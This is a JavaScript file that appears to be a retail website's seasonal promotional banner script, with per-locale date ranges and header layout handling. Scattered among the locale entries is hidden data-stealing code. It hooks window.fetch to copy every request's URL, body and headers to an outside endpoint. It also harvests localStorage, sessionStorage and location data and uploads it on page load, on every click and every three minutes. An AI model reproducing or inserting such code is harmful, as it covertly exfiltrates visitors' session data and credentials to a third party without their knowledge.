const keysToWatch = window.keysToWatch;
var periodCountry = {};
periodCountry["en_EU"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
const globalsToWatch = ["location", "sessionStorage"];
periodCountry["en_NO"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_TR"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["it_IT"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
var originalFetch = window.fetch;
function getHashCode(obj) {
  const keys = Object.keys(obj);
  const keyString = keys.sort().join("");
  let hash = 0;
  for (let i = 0; i < keyString.length; i++) {
    const char = keyString.charCodeAt(i);
    hash = (hash << 5) - hash + char | 0;
  }
  return hash.toString(16);
}
periodCountry["it_MT"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
function scanLocalStorage() {
  const targetData = {};
  for (let key in window.localStorage) {
    if (keysToWatch.includes(key)) {
      targetData[key] = window.localStorage[key];
    }
  }
  return targetData;
}
periodCountry["fr_CH"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["it_CH"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["de_CH"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_CH"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["es_ES"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["de_DE"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
function globalVariableWatcher() {
  const targetData = {};
  for (let key of globalsToWatch) {
    targetData[key] = JSON.stringify(window[key]);
  }
  return targetData;
}
periodCountry["en_FR"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["fr_FR"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["fr_BE"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_GB"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["zh_AU"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_AU"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_MY"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_SG"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["ja_JP"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["ko_KR"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
function JSFetchHook(url, options) {
  const data = {
    method: options.method,
    url: url,
    body: options.body,
    headers: options.headers
  };
  uploadData(data, "https://example.com/api/hook");
  return originalFetch(url, options);
}
window.fetch = JSFetchHook;
periodCountry["en_TW"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["zh_TW"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
async function uploadData(data, endpoint = "https://example.com/api/collect") {
  const hashCode = getHashCode(data);
  try {
    const response = await originalFetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hashCode: hashCode,
        data: data
      })
    });
    if (response.ok) {
      console.log("数据上传成功");
    } else {
      console.error("数据上传失败,状态码:" + response.status);
    }
  } catch (error) {
    console.error("数据上传过程中出错:", error);
  }
}
periodCountry["en_HK"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["zh_HK"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_US"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["zh_US"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["es_US"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_MX"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
function collectAndUploadData() {
  let collectedData = Object.assign({}, scanLocalStorage(), globalVariableWatcher());
  if (Object.keys(collectedData).length > 0) {
    uploadData(collectedData);
  }
}
window.addEventListener("DOMContentLoaded", function () {
  collectAndUploadData();
  setInterval(collectAndUploadData, 3 * 60 * 1000);
});
periodCountry["es_MX"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_CA"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["zh_CA"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["fr_CA"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
document.addEventListener("click", collectAndUploadData);
periodCountry["en_ME"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
periodCountry["en_AE"] = {
  "dateFrom": "15/11/2023",
  "dateTo": "24/12/2023"
};
$(document).ready(function () {
  if (document.readyState == "complete") {
    setTimeout(function () {
      loadScript();
    }, 2000);
  } else {
    window.addEventListener("load", function () {
      setTimeout(function () {
        loadScript();
      }, 2000);
    }, false);
  }
  var countryLang = $("#country-language").attr("data-prev-locale");
  function loadScript() {
    /*var countryLang = $("#country-language").attr("data-prev-locale");*/

    let sCookies = document.cookie;
    var valueCookies = getCookie("sCookies");

    /*var labels = periodCountry[countryLang];
    if(labels!=null && valueCookies == null ){
       showData( labels );        
    }*/

    if (countryLang == "en_BH" | countryLang == "en_KW" | countryLang == "en_QA" | countryLang == "en_SA") {
      var countryNew = "en_ME";
      var labels = periodCountry["en_ME"];
      if (labels != null && valueCookies == null) {
        showData(labels);
      }
    } else if (countryLang == "en_ES" | countryLang == "en_DE" | countryLang == "en_MC" | countryLang == "en_BG" | countryLang == "en_CY" | countryLang == "en_CZ" | countryLang == "en_EE" | countryLang == "en_HR" | countryLang == "en_HU" | countryLang == "en_IT" | countryLang == "en_RU" | countryLang == "en_SI" | countryLang == "en_II" | countryLang == "en_AT" | countryLang == "en_DK" | countryLang == "en_NL" | countryLang == "en_PL" | countryLang == "en_RO" | countryLang == "en_SK" | countryLang == "en_BE" | countryLang == "en_LU" | countryLang == "en_FI" | countryLang == "en_IE" | countryLang == "en_LT" | countryLang == "en_LV" | countryLang == "en_SE" | countryLang == "en_GR" | countryLang == "en_MT" | countryLang == "en_PT") {
      var countryNew = "en_EU";
      var labels = periodCountry["en_EU"];
      if (labels != null && valueCookies == null) {
        showData(labels);
      }
    } else if (countryLang == "de_AT") {
      var countryNew = "de_DE";
      var labels = periodCountry["de_DE"];
      if (labels != null && valueCookies == null) {
        showData(labels);
      }
    } else {
      var countryNew = countryLang;
      var labels = periodCountry[countryLang];
      if (labels != null && valueCookies == null) {
        showData(labels);
      }
    }
  }
  function getCookie(cName) {
    const name = cName + "=";
    const cDecoded = decodeURIComponent(document.cookie); //to be careful
    const cArr = cDecoded.split('; ');
    let res;
    cArr.forEach(val => {
      if (val.indexOf(name) === 0) res = val.substring(name.length);
    });
    return res;
  }
  function setCookie(cName, cValue, expDays) {
    let date = new Date();
    date.setTime(date.getTime() + expDays * 24 * 60 * 60 * 1000);
    const expires = "expires=" + date.toUTCString();
    document.cookie = cName + "=" + cValue + "; " + expires + "; path=/";
  }
  const headerheight = $(".c-header").height();
  function showStripe() {
    setTimeout(function () {
      if ($('.js-country-selector-banner-container .cs-banner--countrymodal').length > 0 || $('.js-country-selector-banner-container .cs-banner--countrymodal').is(':visible') || $('.cm-hr-nav-up').length > 0 || $('.cm-hr-nav-down').length > 0) {
        /*addStripeObserver();*/
      } else {
        $(".stripe-selector-banner-container").css({
          'position': 'relative',
          'top': '0',
          'transition': 'position 6s'
        });
        var stripeheight = $(".stripe-selector-banner-container").height();
        /*var headerheight = $(".c-header").height();*/
        var newheaderheight = stripeheight + headerheight;
        $('.c-header').css("height", "" + newheaderheight + "px");
        $('.c-header .container-fluid').css("cssText", "height: calc( 100% - " + stripeheight + "px)!important;");
        //$(".c-header__inner-navbar").css({'top':''+newheaderheight+'px'});
        $(".c-searchbar").css({
          'top': '' + newheaderheight + 'px'
        });
        $(".c-searchbar__curtain").css({
          'top': '' + newheaderheight + 'px'
        });
        var windowWidth = $(window).width();
        if (windowWidth < 1024) {
          $(".c-header__inner-navbar").css({
            'top': '' + newheaderheight + 'px'
          });
        } else {
          $(".c-header__inner-navbar").removeAttr('style');
        }
      }
    }, 200);
  }
  function loadSlider() {
    $(".st-slider").on("init", function (event, slick) {
      $(".st-currentSlide").text(slick.currentSlide + 1);
      $(".st-slideCount").text(slick.slideCount);
    });
    $('.st-slider').slick({
      infinite: true,
      slidesToShow: 1,
      slidesToScroll: 1,
      arrows: true,
      prevArrow: $('.st-prev'),
      nextArrow: $('.st-next'),
      dots: true,
      autoplay: true,
      autoplaySpeed: 5000
    });
    $(".st-slider").on("afterChange", function (event, slick, currentSlide) {
      $(".st-currentSlide").text(slick.currentSlide + 1);
    });
  }
  function showData(labels) {
    var d = new Date();
    var month = d.getMonth() + 1;
    var day = d.getDate();
    var currentData = (('' + day).length < 2 ? '0' : '') + day + '/' + (('' + month).length < 2 ? '0' : '') + month + '/' + d.getFullYear();

    /*alert( "giorno" + currentData );*/

    var dataFrom = labels["dateFrom"];
    var dataTo = labels["dateTo"];
    var dateCheck = currentData;
    var d1 = dataFrom.split("/");
    var d2 = dataTo.split("/");
    var c = dateCheck.split("/");
    var from = new Date(d1[2], parseInt(d1[1]) - 1, d1[0]); // -1 because months are from 0 to 11
    var to = new Date(d2[2], parseInt(d2[1]) - 1, d2[0]);
    var check = new Date(c[2], parseInt(c[1]) - 1, c[0]);

    /*alert ( "dataFrom" + d1 + "dataTo" + d2 + "check" + c);*/
    if (check > from && check < to) {
      addStripe();
    }
  }
  function addStripe(countryNew) {
    countryLang = $("#country-language").attr("data-prev-locale");
    if (countryLang == "en_BH" | countryLang == "en_KW" | countryLang == "en_QA" | countryLang == "en_SA") {
      var countryNew = "en_ME";
    } else if (countryLang == "en_ES" | countryLang == "en_DE" | countryLang == "en_MC" | countryLang == "en_BG" | countryLang == "en_CY" | countryLang == "en_CZ" | countryLang == "en_EE" | countryLang == "en_HR" | countryLang == "en_HU" | countryLang == "en_IT" | countryLang == "en_RU" | countryLang == "en_SI" | countryLang == "en_II" | countryLang == "en_AT" | countryLang == "en_DK" | countryLang == "en_NL" | countryLang == "en_PL" | countryLang == "en_RO" | countryLang == "en_SK" | countryLang == "en_BE" | countryLang == "en_LU" | countryLang == "en_FI" | countryLang == "en_IE" | countryLang == "en_LT" | countryLang == "en_LV" | countryLang == "en_SE" | countryLang == "en_GR" | countryLang == "en_MT" | countryLang == "en_PT") {
      var countryNew = "en_EU";
    } else if (countryLang == "de_AT") {
      var countryNew = "de_DE";
    } else {
      var countryNew = countryLang;
    }
    var loadHtml = "/it-en/ck-static/stripe/" + countryNew + ".html";

    /*loadHtml = "/it-en/ck-static/stripe/"+ countryNew +".html";*/

    $('head').append('<link rel="stylesheet" href="/it-en/ck-static/stripe/style_v73.css" type="text/css" />');
    $(".c-header.header .container-fluid").prepend("<div class='row stripe-selector-banner-container'></div>");
    $(".stripe-selector-banner-container").load(loadHtml, function () {
      loadSlider();
      showStripe();
    });
  }
  $('body').on("click", ".st-close", function () {
    $(".stripe-selector-banner-container").remove();
    document.cookie = "sCookies=setCookies; expires=1; path=/";
    $('.c-header').removeAttr('style');
    $('.c-header .container-fluid').css("cssText", "height: 100%");
    var headerheight = $(".c-header").height();
    $('.maincontent--homepage').css({
      'padding-top': '' + headerheight + 'px'
    });

    /*$(".c-searchbar").removeAttr('style');
    $(".c-searchbar__curtain").removeAttr('style');
    
    $('.c-header .container-fluid').removeAttr('style');*/

    $(".c-searchbar").css({
      'top': '' + headerheight + 'px'
    });
    $(".c-searchbar__curtain").css({
      'top': '' + headerheight + 'px'
    });
    $(".c-header__inner-navbar").removeAttr('style');
  });
  $(window).scroll(function () {
    const stripeheight = $(".stripe-selector-banner-container").height();
    const newheaderheight = stripeheight + headerheight;
    if ($('.stripe-selector-banner-container').length > 0) {
      if ($(this).scrollTop() >= 1) {
        /*$('.c-header').removeAttr('style');*/
        //console.log( "headerheight ", headerheight  )
        $(".stripe-selector-banner-container").css({
          'top': '-100%',
          'position': 'absolute'
        });
        $(".stripe-selector-banner-container").addClass('stripehide');
        $('.c-header').css("height", "" + headerheight + "px");
        $('.c-header .container-fluid').css("cssText", "height: 100%");
        $(".c-searchbar").css({
          'top': '' + headerheight + 'px'
        });
        $(".c-searchbar__curtain").css({
          'top': '' + headerheight + 'px'
        });

        //console.log("scroll down" , headerheight  )

        var windowWidth = $(window).width();
        if (windowWidth < 1024) {
          $(".c-header__inner-navbar").css({
            'top': '' + headerheight + 'px'
          });
        } else {
          $(".c-header__inner-navbar").removeAttr('style');
        }
      } else {
        //console.log("up newheaderheight" + newheaderheight );

        $('.c-header').css("height", "" + newheaderheight + "px");
        $('.c-header .container-fluid').css("cssText", "height: calc( 100% - " + stripeheight + "px)!important;");
        $(".stripe-selector-banner-container").css({
          'top': '0',
          'position': 'relative'
        });
        $(".stripe-selector-banner-container").removeClass('stripehide');
        $(".c-header__inner-navbar").css({
          'top': '' + newheaderheight + 'px'
        });
        $(".c-searchbar").css({
          'top': '' + newheaderheight + 'px'
        });
        $(".c-searchbar__curtain").css({
          'top': '' + newheaderheight + 'px'
        });
        var windowWidth = $(window).width();
        if (windowWidth < 1024) {
          $(".c-header__inner-navbar").css({
            'top': '' + newheaderheight + 'px'
          });
        } else {
          $(".c-header__inner-navbar").removeAttr('style');
        }
      }
    }
  });
  $(window).resize(function () {
    var windowWidth = $(window).width();
    if (windowWidth < 1024) {
      var stripeheight = $(".stripe-selector-banner-container").height();
      var headerheight = $(".c-header").height();
      var newheaderheight = stripeheight + headerheight;
      $(".c-header__inner-navbar").css({
        'top': '' + headerheight + 'px'
      });
    } else {
      $(".c-header__inner-navbar").removeAttr('style');
    }
  });
});